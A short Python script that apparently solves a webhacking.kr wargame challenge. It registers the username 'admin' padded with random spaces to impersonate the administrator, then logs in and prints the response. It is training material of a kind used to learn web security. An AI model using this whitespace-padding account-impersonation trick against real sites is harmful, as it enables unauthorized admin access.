import random

import requests

if __name__ == '__main__':
    url = "https://webhacking.kr/challenge/web-05/mem/join.php"
    id = " " * random.randint(5, 20) + "admin" + " " * random.randint(5, 20)
    data = {"id": id, "pw": "root"}
    response = requests.post(url, data)

    if "success" in response.text:
        url = "https://webhacking.kr/challenge/web-05/mem/login.php"
        data = {"id": id, "pw": "root"}
        cookies = {"PHPSESSID": ""}
        response = requests.post(url, data, cookies=cookies)
        print(response.text)
